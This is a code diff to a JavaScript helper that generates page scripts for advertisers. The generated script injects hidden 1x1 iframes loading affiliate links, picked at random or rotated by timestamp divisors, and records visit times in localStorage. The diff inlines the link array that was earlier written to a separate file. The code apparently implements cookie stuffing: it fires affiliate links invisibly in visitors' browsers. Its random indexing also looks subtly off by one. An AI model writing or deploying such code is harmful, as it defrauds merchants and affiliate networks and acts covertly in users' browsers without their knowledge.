@@ -15,24 +15,21 @@ class generate_helper{
           generate += " localStorage['"+cookie_custom_name+"'] = "+advertisor[i].adv_name.toLowerCase()+"_time;";
           if(advertisor[i].type == 3)  //Multi choose product
           {
-            var multi_prod_file_content = "var z_links = new Array(";
+            generate += "var z_links = new Array(";
             for(var j=0; j <affiliate.length;j++)
             {
-              multi_prod_file_content += "'"+affiliate[j].link+"',";
+              if(affiliate[j].affiliate_type == 1)
+              {
+                generate += "'"+affiliate[j].link+"',";
+              }              
             }
-            multi_prod_file_content = multi_prod_file_content.slice(0, -1);
-            multi_prod_file_content += ");";
-
-            var multi_prod_file_name = "p_"+advertisor[i].adv_name+".js";
-            // console.log(multi_prod_file_content);
-            fs.writeFile(directory+"/"+multi_prod_file_name, multi_prod_file_content, function(err) {
-              if (err) console.log(err);
-              else console.log(1);
-            }); 
-            var multi_prod_file_url = advertisor[i].live_url+"api/plinks/"+multi_prod_file_name;
-            generate += "var head = document.getElementsByTagName('head')[0];var script = document.createElement('script');script.type = 'text/javascript';script.src = '"+ multi_prod_file_url +"';head.appendChild(script);rand = (Math.floor(Math.random() * 50) + 1  );";
-            generate += "var rand = (Math.floor(Math.random() * "+parseInt(process.env.PRODUCT_LIMIT)+") + 1  );";
-            generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+            generate = generate.slice(0, -1);
+            generate += ");";
+          }
+          if(advertisor[i].type == 3 && advertisor[i].is_divisor_needed == 0)  //Multi choose product without divisor
+          {
+            generate += "var rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
+            generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";                
       
           }else{
             if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
@@ -44,23 +41,37 @@ class generate_helper{
                   generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                 }
               }
-            }else{
+            }else{  //Dividing afiiliates by divisors
               generate += "var f = Math.floor(Date.now() / 1000);";
               
               for(var j=0,k=0; j <affiliate.length;j++)
-              {
+              {               
+                
                 if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
                 {
-                    if(k == 0)
+                  if(affiliate[j].affiliate_type == 0)
                     {
-                      generate += "if (f % "+affiliate[j].divisor+" == 0) {";
-                    }else if(affiliate[j].divisor > 1){
-                      generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
-                    }else if(affiliate[j].divisor == 1){
-                      generate += "} else {";
-                    }
+                      if(k == 0)
+                      {
+                        generate += "if (f % "+affiliate[j].divisor+" == 0) {";
+                      }else if(affiliate[j].divisor > 1){
+                        generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
+                      }else if(affiliate[j].divisor == 1){
+                        generate += "} else {";
+                      }
                     
-                    generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+                      if(affiliate[j].link == "multi_choice_prod")
+                      {
+                        generate += "var z_rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
+                        generate += "e += \"<iframe src='\"+z_links[z_rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+                      }else{
+                        generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+                      }
+                      
+                    }
+                   
+                    
+
                   k++;
                 }            
               }
